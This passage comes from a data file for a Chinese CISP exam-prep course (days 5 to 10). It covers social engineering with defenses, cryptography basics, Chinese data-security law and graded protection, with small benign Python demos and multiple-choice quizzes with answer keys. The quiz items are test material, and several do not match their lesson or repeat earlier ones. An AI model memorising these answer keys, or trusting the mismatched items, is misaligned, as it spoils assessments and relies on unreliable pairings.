Phishing）——定制化高效攻击\n\n**与普通钓鱼的核心区别：**不是群发而是针对特定个人或组织，攻击前会进行信息收集。\n**手法：**研究目标社交媒体、职位、同事名字，定制高度逼真的诱饵邮件。\n**案例：**攻击者知道你刚参加完行业会议，发来"会议资料请查收"的邮件——成功率远高于泛称的钓鱼。\n**防御：**只有"内容太精准了"反而要警惕。通过其他渠道（如Slack/Teams）确认发件人是否真的发了邮件。\n\n### 三、鲸钓（Whaling）——针对高管的钓鱼\n\n**目标：**CEO、CFO等高管，追求的是单次高价值回报（如授权大额转账）。\n**手法：**伪装银行或监管机构，发送法律传票或合规通知，利用高管对法律后果的恐惧。\n\n### 四、电话诈骗（Vishing = Voice Phishing）\n\n**手法：**冒充银行客服、公安、税务局，声称"你的银行账户涉嫌洗钱需要配合调查"。\n**技术辅助：**伪造来电显示（显示为110或银行官方号码）。\n**防御：**挂断后主动拨打官方客服电话验证。官方机构不会通过电话索要密码或验证码。\n\n### 五、尾随/肩窥（Tailgating / Shoulder Surfing）——物理社会工程\n\n**尾随：**跟随刷卡进入的员工通过门禁——"能帮我开下门吗，忘带卡了"。**肩窥：**在公共场合偷窥他人屏幕上的密码、邮件等敏感信息。\n**防御：**严格执行一人一卡、可疑人员主动询问、防窥屏贴膜\n\n## 防范体系\n\n**最重要：安全意识培训——人员是社会工程学的唯一防线。**\n\n**技术措施：**\n- 邮件安全网关：SPF/DKIM/DMARC防邮件伪造\n- URL过滤：阻断已知钓鱼网站\n- MFA多因素认证：即使密码泄露，攻击者也无法登录\n- 沙箱：可疑附件在隔离环境中打开检测\n\n**管理措施：**\n- 大额转账必须双重确认（电话+审批）\n- 定期钓鱼演练，统计点击率并针对性培训\n- 建立"可疑行为报告"的便捷渠道\n\n## \n## 🔴 高频考点\n\n· 普通钓鱼(群发) vs **鱼叉钓鱼(定制+信息收集)** vs 鲸钓(高管)——三类钓的区分层次常考\n· 社会工程学利用的是**人性弱点**而非技术漏洞，**安全意识培训**是唯一有效长期防御\n· Spear Phishing(鱼叉式)和Whaling(鲸钓)的英文名称要能对上\n## 💜 记忆口诀\n\n· **三类钓鱼**："普通撒网、鱼叉瞄准、鲸钓大鱼(高管)"\n· **四大心理**："信-急-贪-怕"——信任(伪装)、紧迫(限时)、贪婪(免费)、恐惧(吓唬)\n学习建议\n- 普通钓鱼(群发) vs 鱼叉钓鱼(定制) vs 鲸钓(高管)的区别要记住\n- 社会工程学利用的不是技术漏洞，是人性弱点\n- 安全意识培训是唯一真正有效的长期防御',
    codeExample: { language: 'python', code: '# 钓鱼邮件检测\ndef detect_phishing(email):\n    risks = []\n    suspicious = ["amaz0n", "go0gle", "app1e", "paypa1"]\n    for domain in suspicious:\n        if domain in email.get("from", "").lower():\n            risks.append(f"可疑域名: {domain}")\n    urgent_words = ["紧急", "立即", "账户危险", "最后警告"]\n    for word in urgent_words:\n        if word in email.get("body", ""):\n            risks.append(f"紧迫性操纵: {word}")\n    return risks\n\nemail = {"from": "security@app1e.com", "body": "您的账户异常，请立即验证!"}\nprint(f"风险评估: {detect_phishing(email)}")', description: '模拟钓鱼邮件检测' },
    quiz: [{"id":"q5-1","question":"社会工程学攻击主要利用什么？","options":["技术漏洞","人的心理弱点","网络协议缺陷","硬件漏洞"],"correctIndex":1,"explanation":"社会工程学攻击利用人的心理弱点进行欺骗。"},{"id":"q5-2","question":"以下哪种是社会工程攻击？","options":["SQL注入","网络钓鱼（Phishing）","DDoS攻击","缓冲区溢出"],"correctIndex":1,"explanation":"网络钓鱼是社会工程攻击的典型代表。"},{"id":"q5-3","question":"防范社会工程攻击最有效的方法是？","options":["安装防火墙","安全意识和培训","使用VPN","加密数据"],"correctIndex":1,"explanation":"社会工程攻击针对的是人，最有效的防范是提高安全意识。"},{"id":"q5-4","question":"尾随进入（Tailgating）属于什么类型的攻击？","options":["网络攻击","物理+社会工程攻击","密码攻击","DDoS攻击"],"correctIndex":1,"explanation":"尾随进入利用人的礼貌和疏忽，属于物理+社会工程攻击。"},{"id":"q5-5","question":"钓鱼邮件通常包含什么特征？","options":["正式的发件人地址","紧急的语气和可疑的链接","正确的公司logo","正确的语法"],"correctIndex":1,"explanation":"钓鱼邮件通常使用紧急语气催促用户点击可疑链接。"}],
    expertNotes: dayExpertNotes[5],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-6', day: 6, week: 1, title: '密码学基础概念',
    objectives: ['理解密码学术语', '了解加密解密原理', '掌握基本分类'],
    content: '# 密码学基础概念\n\n> 📋 **本节大纲**\u2003核心术语 | 对称vs非对称加密(对比表) | 混合加密(TLS原理) | 四大应用场景\n\n## 概述\n\n密码学（Cryptography）是研究如何保护信息安全的数学科学，是CISP考试的核心模块之一。密码学不仅要"让人看不懂"（加密），还要确保"没人偷偷改"（完整性）、"确定是你干的"（不可否认）。密码学是整个信息安全体系的技术基石。\n\n## 密码学核心术语\n\n**明文（Plaintext）：**加密前可读的原始信息。"明天开会"就是明文。\n\n**密文（Ciphertext）：**加密后的不可读数据。同样的"明天开会"经过AES加密后可能变成"7f3a0e8b..."的乱码。\n\n**加密（Encryption）：**用密钥和算法将明文转为密文的过程。明文+密钥→算法→密文。\n\n**解密（Decryption）：**用密钥将密文还原为明文的过程。密文+密钥→算法→明文。\n\n**密钥（Key）：**控制加解密的核心参数。密码学核心原则（Kerckhoffs原则）：系统的安全性应完全依赖密钥的保密，而不应依赖算法的保密。算法可以公开，密钥必须保密。\n\n**算法（Algorithm）：**加解密使用的数学方法（AES/RSA/ECC等）。现代密码学算法都是公开的、经过学术界严格审查的——安全依靠密钥，不靠"算法保密"。\n\n## 对称加密 vs 非对称加密\n\n这是CISP考试最高频的密码学考点，必须清晰区分。\n\n### 对称加密（Symmetric Encryption）\n\n**核心理念：**加密和解密使用**同一个**密钥。发送方和接收方共享密钥。\n\n**工作流程：**\n1. 双方事先共享密钥（通过安全信道）\n2. 发送方用密钥加密明文→密文\n3. 接收方用同一密钥解密密文→明文\n\n**优势：**速度快（比非对称快约1000倍），适合加密大量数据（文件、数据库、通信批量加密）\n\n**劣势：**密钥分发困难——你怎么把密钥安全地发给对方？如果你们已经有一个安全信道，为什么还需要加密？这就是"密钥分发问题"（Key Distribution Problem）。\n\n**代表算法：**\n- **AES（高级加密标准）：**当前最广泛使用的对称加密算法。分组长度128位，密钥长度128/192/256位\n- **DES：**56位密钥，1998年被暴力破解（56位密钥空间太小），已废弃\n- **3DES：**DES的三次加密增强版，等效112位密钥，正在被AES替代\n- **SM4：**中国国密标准对称密码算法，128位分组和密钥\n\n### 非对称加密（Asymmetric Encryption / 公钥密码）\n\n**核心理念：**使用一对数学上相关但无法互相推导的密钥——**公钥和私钥**。\n\n**工作流程：**\n1. 生成密钥对：公钥（可公开）和私钥（严格保密）\n2. **加密场景：**任何人都可以用接收方的公钥加密数据，只有接收方的私钥能解密\n3. **签名场景：**发送方用自己私钥签名，任何人都可以用发送方的公钥验证\n\n**优势：**完美解决了密钥分发问题——公钥可以通过任意渠道传输（网站、邮件、写在墙上都可以），不怕被窃听。\n\n**劣势：**计算量大、速度慢（不适用于加密大数据）。\n\n**代表算法：**\n- **RSA：**最广泛使用的非对称算法，基于大整数质因数分解的数学难题。推荐密钥长度≥2048位（2024+）。1024位RSA已被证明可被破解。\n- **ECC（椭圆曲线密码学）：**相比RSA，同等安全强度下密钥更短——256位ECC ≈ 3072位RSA安全性。移动设备首选。\n- **SM2：**中国国密标准椭圆曲线公钥密码算法\n\n### 对称 vs 非对称 速查表\n\n| 维度 | 对称加密 | 非对称加密 |\n|------|---------|-----------|\n| 密钥数量 | 1个（加密解密同一密钥） | 2个（公钥+私钥） |\n| 速度 | 快（~1000倍于非对称） | 慢 |\n| 密钥分发 | 困难（需要安全信道） | 简单（公钥可公开） |\n| 典型用途 | 数据加密存储/传输 | 密钥交换、数字签名 |\n| 代表算法 | AES、SM4 | RSA、ECC、SM2 |\n\n### 混合加密（Hybrid Encryption）——实际应用的标准方案\n\n**只用对称加密的问题：**密钥怎么安全传给对方？\n**只用非对称加密的问题：**加密大数据太慢了。\n\n**混合方案 — TLS/HTTPS的标准实践：**\n1. 用非对称加密（RSA/ECC）安全交换一个临时的对称密钥\n2. 后续所有大量数据用对称加密（AES）加密——速度快\n3. 综合了两者的优势：非对称解决密钥交换，对称解决数据加密\n\n这就是你访问任何HTTPS网站时浏览器和服务器之间发生的事情。\n\n## 密码学的四大应用\n\n**1. 数据机密性：**加密存储和传输——AES加密数据库、TLS加密网络通信\n**2. 数据完整性：**哈希函数验证数据未被篡改——下载文件校验SHA-256\n**3. 身份认证：**数字签名验证发送者身份——软件数字签名、邮件签名\n**4. 不可否认性：**私钥签名后无法否认"不是我签的"——电子合同的数字签名\n\n## \n## 🔴 高频考点\n\n· **对称加密vs非对称加密的核心区别**——对称=同密钥(快)、非对称=公钥+私钥(慢)\n· 混合加密=非对称交换密钥+对称加密数据——HTTPS/TLS的标准方案\n· AES分组长度128位，RSA基于大数分解，ECC基于椭圆曲线——三个算法数学基础要记住\n## 💜 记忆口诀\n\n· **对称vs非对称**："对称=一把钥匙两人用(快但分发难)、非对称=两把钥匙(公钥开门/私钥留着)"\n· **混合加密**："非对称送钥匙、对称加密数据"\n· **算法根基**：RSA=大数分解、ECC=椭圆曲线、AES=对称标准\n学习建议\n\n- 对称加密和非对称加密的核心区别是CISP必考题\n- 记住：混合加密 = TLS/HTTPS的标准方案\n- AES算法的分组长度（128位）和密钥长度（128/192/256）要记住\n- RSA基于大数分解、ECC基于椭圆曲线离散对数——知道数学基础',
    codeExample: { language: 'python', code: '# 简单XOR加密演示\ndef xor_encrypt(text, key):\n    return "".join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key * (len(text) // len(key) + 1)))\n\nmessage = "Hello CISP"\nkey = "KEY"\n\nencrypted = xor_encrypt(message, key)\ndecrypted = xor_encrypt(encrypted, key)\n\nprint(f"原始: {message}")\nprint(f"加密: {repr(encrypted)}")\nprint(f"解密: {decrypted}")', description: '演示简单对称加密' },
    quiz: [{"id":"q6-1","question":"以下哪种是对称加密算法？","options":["RSA","AES","ECC","DSA"],"correctIndex":1,"explanation":"AES是对称加密算法。"},{"id":"q6-2","question":"数字签名使用什么密钥进行签名？","options":["接收者的公钥","发送者的私钥","发送者的公钥","共享密钥"],"correctIndex":1,"explanation":"数字签名使用发送者的私钥进行签名。"},{"id":"q6-3","question":"SHA-256的输出长度是多少位？","options":["128位","160位","256位","512位"],"correctIndex":2,"explanation":"SHA-256的输出长度是256位。"},{"id":"q6-4","question":"PKI体系中，CA的作用是什么？","options":["加密数据","签发和管理数字证书","存储用户密码","检测网络攻击"],"correctIndex":1,"explanation":"CA负责签发和管理数字证书。"},{"id":"q6-5","question":"HTTPS使用什么协议实现安全传输？","options":["IPSec","TLS/SSL","SSH","PGP"],"correctIndex":1,"explanation":"HTTPS使用TLS/SSL协议加密传输。"}],
    expertNotes: dayExpertNotes[6],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  {
    id: 'day-7', day: 7, week: 1, title: '第一周总结与测验',
    objectives: ['回顾第一周知识点', '检验学习成果', '查漏补缺'],
    content: '# 第一周学习总结\n\n## 本周学习内容\n\n### Day 1: 信息安全概述\n- 信息安全定义和重要性\n- CIA三要素：机密性、完整性、可用性\n- 安全威胁分类\n\n### Day 2: 信息安全发展历程\n- 通信安全→计算机安全→网络安全→信息化安全\n- 关键标准和事件\n\n### Day 3: 网络安全基本概念\n- OSI七层模型和TCP/IP四层模型\n- 常见网络攻击类型\n\n### Day 4: 恶意软件分类\n- 病毒、蠕虫、木马、勒索软件区别\n- 传播方式和防范\n\n### Day 5: 社会工程学攻击\n- 社会工程学原理\n- 钓鱼攻击和防范\n\n### Day 6: 密码学基础\n- 基本术语\n- 对称加密与非对称加密\n\n## 知识要点回顾\n\n| 知识点 | 核心内容 |\n|---------|----------|\n| CIA三要素 | 机密性、完整性、可用性 |\n| 恶意软件 | 病毒需要宿主，蠕虫独立 |\n| 社会工程学 | 利用人性弱点 |\n| 加密技术 | 对称加密速度快，非对称更安全 |\n\n## 下周预告\n\n第二周将学习：\n- 中国网络安全法律法规\n- 等级保护制度\n- 数据安全与个人信息保护',
    quiz: [{"id":"q7-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q7-2","question":"以下关于第一周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q7-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q7-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q7-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[7],
    recommendedTools: [
    {
      id: 'nmap',
      name: 'Nmap',
      description: '网络发现和端口扫描工具',
      url: ''
    },
    {
      id: 'wireshark',
      name: 'Wireshark',
      description: '网络协议分析工具',
      url: ''
    },
    {
      id: 'kali',
      name: 'Kali Linux',
      description: '渗透测试专用操作系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'juice-shop',
      name: 'OWASP Juice Shop',
      description: '包含 OWASP Top 10 漏洞的Web应用靶场',
      url: ''
    },
    {
      id: 'dvwa',
      name: 'DVWA',
      description: 'Damn Vulnerable Web App - Web漏洞练习平台',
      url: ''
    }
  ]
  },
  // ========== Week 2: 信息安全法规 ==========
  {
    id: 'day-8', day: 8, week: 2, title: '中国网络安全法律法规体系',
    objectives: ['了解中国法律框架', '理解主要法规内容', '掌握合规要求'],
    content: '# 中国网络安全法律法规体系\n\n> 📋 **本节大纲**\u2003三部核心法律(网安法/数安法/个保法) | 关键配套法规速查表 | 违规后果对比\n\n## 概述\n\n中国已建立起以《网络安全法》《数据安全法》《个人信息保护法》三部法律为核心，配套多部行政法规和部门规章的网络安全法律体系。CISP考试对法律框架的考查逐年加重，重点在于区分三部核心法律的管辖范围和违规后果。\n\n## 三部核心法律\n\n### 一、《中华人民共和国网络安全法》（2017年施行）\n\n**定位：**网络安全领域基础性法律，侧重于网络运行安全和网络空间主权。\n\n**核心制度：**\n- **网络安全等级保护制度（等保2.0）：**所有网络运营者必须定级备案、安全建设、等级测评、监督检查\n- **关键信息基础设施（CII）保护：**对金融、能源、交通、通信等行业的关键系统施加更高的安全要求，包括数据境内存储和网络安全审查\n- **个人信息保护：**网络运营者收集使用个人信息需经用户同意、公开规则、不泄露篡改\n- **实名制：**为用户提供网络接入、发布信息等服务时必须要求真实身份信息\n\n**违规后果：**CII运营者不履行安全义务——罚款10-100万元，直接负责人罚款1-10万元\n\n### 二、《中华人民共和国数据安全法》（2021年施行）\n\n**定位：**规范数据处理活动，保障数据安全，促进数据开发利用。\n\n**核心制度：**\n- **数据分类分级保护：**将数据分为核心数据、重要数据、一般数据三级，分别施加保护\n- **数据安全审查制度：**对影响国家安全的数据处理活动进行安全审查\n- **数据出境管理：**重要数据出境需经安全评估，核心数据原则上不出境\n- **数据安全风险评估：**重要数据处理者定期开展风险评估\n\n**违规后果：**最高罚款1000万元，情节严重的责令停业整顿、吊销相关业务许可证\n\n### 三、《中华人民共和国个人信息保护法/PIPL》（2021年施行）\n\n**定位：**保护个人信息权益，规范个人信息处理活动。\n\n**核心内容：**\n- **七项处理原则：**合法正当必要诚信、目的限制、数据最小化、公开透明、质量保证、安全保障、责任明确\n- **数据主体七项权利：**知情权、查阅权、更正权、删除权（被遗忘权）、限制处理权、可携带权、反对权\n- **敏感个人信息特别保护：**生物识别、金融账户、行踪轨迹等需单独同意\n- **跨境传输规则：**需通过安全评估、签订标准合同或获得认证\n\n**违规后果：**最严厉——最高5000万元或上一年度营业额5%（取高者）\n\n## 关键配套法规速查\n\n| 法规 | 发布年份 | 核心要求 |\n|------|---------|---------|\n| 等保2.0 | 2019 | 定级备案-安全建设-等级测评-监督检查 |\n| CII安全保护条例 | 2021 | CII运营者安全义务、安全审查、检测预警 |\n| 网络安全审查办法 | 2022 | 影响国家安全的产品服务需申报审查 |\n| 数据出境安全评估办法 | 2022 | 出境数据超量或涉及重要/敏感数据需评估 |\n\n## \n## 🔴 高频考点\n\n· **PIPL罚款上限（5000万/年营业额5%）**三大法中处罚最重——选罚款上限时要区分哪个法\n· 三部法律管辖：网安法→网络运行安全、数安法→数据处理活动、PIPL→个人信息\n· CII（关键信息基础设施）概念在三大法中都有涉及\n## 💜 记忆口诀\n\n· **三法记法**："网(运行)·数(数据)·人(信息)"\n· **罚款层级**：网安法百万→数安法千万→PIPL五千万或五点\n· **CII八行业**："通能交金政水卫国"\n学习建议\n- 三部法律按管辖范围区分：网络安全法→网络运行安全、数据安全法→数据处理活动、PIPL→个人信息\n- PIPL罚款最高（5000万/5%营收），是三大法中处罚力度最重的\n- CII（关键信息基础设施）概念在三部法律中都有涉及',
    codeExample: { language: 'python', code: '# 合规检查清单\ndef check_compliance(features):\n    requirements = ["防火墙", "入侵检测", "日志审计", "数据加密", "应急预案"]\n    passed = sum(1 for req in requirements if features.get(req, False))\n    return passed, len(requirements)\n\nfeatures = {"防火墙": True, "入侵检测": True, "日志审计": True}\npassed, total = check_compliance(features)\nprint(f"合规检查: {passed}/{total} 项通过")\nprint(f"合规率: {(passed/total)*100:.1f}%")', description: '模拟合规检查' },
    quiz: [{"id":"q8-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q8-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q8-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q8-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q8-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[10],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-9', day: 9, week: 2, title: '等级保护制度',
    objectives: ['理解等级保护意义', '了解五个保护等级', '掌握定级流程'],
    content: '# 等级保护制度\n\n> 📋 **本节大纲**\u2003五个保护等级详解 | 定级流程五步 | 等保2.0"一个中心三重防护" | 测评要求速记\n\n## 概述\n\n网络安全等级保护制度（等保2.0）是中国网络安全领域最核心的制度安排，法律依据是《网络安全法》第21条。通俗讲就是"对信息系统分等级进行保护"——系统越重要，保护要求越高、测评频次越密、违规处罚越重。\n\n## 五个保护等级详解\n\n**第一级：自主保护级**\n- 系统破坏仅损害公民/法人合法权益，不损害社会公共利益和国家安全\n- 运营者自主定级、自主保护，不需要公安机关备案和测评\n- 典型：小型企业官网、个人博客\n\n**第二级：指导保护级**\n- 系统破坏对社会公共利益造成一般损害，但不危害国家安全\n- 需向公安机关备案，建议（非强制）进行等级测评\n- 典型：中型企业信息系统\n\n**第三级：监督保护级（最常见、考试最高频）**\n- 系统破坏对社会公共利益造成严重损害，或对国家安全造成一般损害\n- **必须**每年至少一次等级测评，由公安机关监督检查\n- 典型：政府门户网站、银行系统、电力调度系统、大型电商平台\n- CISP考试重点：三级是最高频考点，记住"每年至少一次测评"\n\n**第四级：强制保护级**\n- 系统破坏对国家安全造成严重损害\n- 至少每半年一次测评，公安机关强制监督检查\n- 典型：国家核心部委内部系统\n\n**第五级：专控保护级**\n- 系统破坏对国家安全造成特别严重损害\n- 由国家安全专门机构管控，测评要求为国家秘密\n- 典型：国家核心机密系统\n\n## 定级流程\n\n定级是等保的第一步也是关键一步：\n1. **确定定级对象：**识别需要保护的网络系统——一个系统一个定级\n2. **初步确定等级：**根据业务信息安全和系统服务安全两个维度综合评估\n3. **专家评审：**邀请行业专家和安全专家评审定级合理性\n4. **主管部门核准：**行业主管/监管部门对定级结果进行核准\n5. **公安机关备案：**三级以上系统必须到公安机关办理备案手续\n\n## 等保2.0的"一个中心、三重防护"\n\n等保2.0对三级系统的安全技术框架提出了"一个中心、三重防护"架构：\n- **安全管理中心：**统一管理所有安全设备和策略\n- **安全通信网络：**网络层面的安全防护（加密、VPN）\n- **安全区域边界：**网络边界的安全防护（防火墙、IDS/IPS）\n- **安全计算环境：**主机和应用层面的安全防护（访问控制、补丁管理）\n\n**安全管理五大领域：**安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理\n\n## 测评要求速记\n\n| 等级 | 测评要求 | 备案要求 |\n|------|---------|---------|\n| 一级 | 不需要 | 不需要 |\n| 二级 | 建议测评 | 需备案 |\n| 三级 | **每年至少一次**（必考） | 需备案 |\n| 四级 | 至少每半年一次 | 需备案 |\n| 五级 | 国家专控 | 国家专控 |\n\n## \n## 🔴 高频考点\n\n· **三级等保"每年至少一次"测评**——最高频考点，一/二级不需要强制测评\n· 五级名词：自主(一)、指导(二)、**监督(三)**、强制(四)、专控(五)\n· 等保2.0架构："一个中心(安全管理中心)+三重防护(通信网络/区域边界/计算环境)"\n## 💜 记忆口诀\n\n· **五级名称**："自主(一)→指导(二)→监督(三)→强制(四)→专控(五)"\n· **测评频次**："一二不强制、三年一次、四半年一次、五国家定"\n学习建议\n- 三级是CISP最高频考点："每年至少一次测评"\n- 区分"自主"（一级）、"指导"（二级）、"监督"（三级）、"强制"（四级）、"专控"（五级）\n- "一个中心、三重防护"是等保2.0的核心安全技术架构',
    codeExample: { language: 'python', code: '# 等级保护定级模拟\ndef calculate_level(business_impact, service_scope):\n    score = business_impact * 0.6 + service_scope * 0.4\n    if score <= 1: return 1, "自主保护级"\n    elif score <= 2: return 2, "指导保护级"\n    elif score <= 3: return 3, "监督保护级"\n    elif score <= 4: return 4, "强制保护级"\n    else: return 5, "专控保护级"\n\n# 某电商平台评估\nlevel, name = calculate_level(business_impact=3, service_scope=3)\nprint(f"定级结果: 第{level}级 - {name}")', description: '模拟等级保护定级' },
    quiz: [{"id":"q9-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q9-2","question":"以下关于等级保护制度的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q9-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q9-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q9-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-10', day: 10, week: 2, title: '数据安全与个人信息保护',
    objectives: ['理解数据分类分级', '了解个人信息保护要求', '掌握数据安全措施'],
    content: '# 数据安全与个人信息保护\n\n> 📋 **本节大纲**\u2003数据分类分级(法定三级+企业四级) | 数据全生命周期保护 | PIPL核心要点(六原则+七权利)\n\n## 概述\n\n《数据安全法》和《个人信息保护法》是2021年同年施行的两部重要法律，共同构建了中国数据保护的法律框架。数据安全法关注"国家安全视角"的数据安全，PIPL关注"个人权益视角"的隐私保护。CISP考试常考查两部法律的管辖范围区别和数据分类分级制度。\n\n## 数据分类分级\n\n《数据安全法》第21条明确要求实行数据分类分级保护，这是数据安全治理的基础。\n\n### 法定三级分类\n\n**核心数据：**一旦泄露、篡改可能危害国家安全、国民经济命脉、重大公共利益的数据。最高等级保护，原则上不得出境。\n\n**重要数据：**一旦泄露可能危害国家安全、经济运行的数据。包括：未公开的政府信息、基因/地理数据、CII漏洞信息。出境需安全评估。\n\n**一般数据：**核心和重要之外的数据，企业自主定级管理。\n\n### 企业实践中的四级分类\n- **公开级：**可对外发布（产品介绍、已公开年报）\n- **内部级：**仅限内部流转（员工手册、内部公告）\n- **机密级：**仅授权人员访问（客户名单、合同、技术方案）\n- **绝密级：**极少数人可知（商业机密、核心算法）\n\n### 数据全生命周期保护\n\n数据从产生到销毁共经历五个阶段，每个阶段都需要安全控制：\n1. **收集阶段：**合法合规获取用户同意，遵循最小必要原则\n2. **存储阶段：**加密存储、访问控制、定期备份\n3. **使用阶段：**权限管控、脱敏处理、审计追踪\n4. **共享阶段：**安全评估、脱敏后共享、合同约束\n5. **销毁阶段：**永久删除、不可恢复（格式化不够，需消磁或物理粉碎）\n\n## 个人信息保护核心要点\n\n### 个人信息定义\n以电子或其他方式记录的与已识别或可识别自然人有关的各种信息——姓名、电话、身份证号、位置、上网记录等。\n\n### 敏感个人信息（需单独同意）\n- 生物识别：人脸、指纹、声纹\n- 金融账户信息\n- 行踪轨迹\n- 医疗健康信息\n- 14岁以下未成年人信息\n\n**处理敏感信息必须：取得单独同意 + 告知必要性 + 进行影响评估**\n\n### 处理原则六项\n1. **合法正当：**符合法律，不得欺诈误导\n2. **最小必要：**只收集目的所需的最少数据\n3. **目的明确：**告知用户收集目的，不超范围使用\n4. **知情同意：**清晰告知+用户主动同意（不是默认勾选）\n5. **公开透明：**告知处理方式、保存期限、用户权利\n6. **确保安全：**技术+管理措施保障数据安全\n\n### 数据主体七项权利\n知情权→查阅权→更正权→删除权（被遗忘权）→限制处理权→可携带权→反对权\n\n## \n## 🔴 高频考点\n\n· **敏感个人信息需要"单独同意"**——PIPL核心考点，区别于一般的"知情同意"\n· 数安法(国家安全视角) vs PIPL(个人权益视角)——两法的管辖视角要区分\n· 数据主体七项权利：知·查·改·删·限·带·反——"删除权=被遗忘权"必考\n## 💜 记忆口诀\n\n· **PIPL七项权利**："知-查-改-删-限-带-反"\n· **处理六原则**："合-最-目-知-公-安"\n· **敏感vs一般**："敏感需单独同意、一般知情就可以"\n学习建议\n- 数据安全法（国家安全视角）vs PIPL（个人权益视角）要区分\n- 敏感个人信息和一般个人信息最大的区别：处理前者需要"单独同意"\n- "最小必要"原则是两部法律共同的核心理念',
    codeExample: { language: 'python', code: '# 个人信息脱敏\ndef mask_id_card(id_card):\n    if len(id_card) == 18:\n        return id_card[:6] + "********" + id_card[-4:]\n    return id_card\n\ndef mask_phone(phone):\n    if len(phone) >= 11:\n        return phone[:3] + "****" + phone[-4:]\n    return phone\n\nprint(f"身份证: {mask_id_card(\"110101199001011234\")}")\nprint(f"手机号: {mask_phone(\"13812345678\")}")', description: '演示个人信息脱敏' },
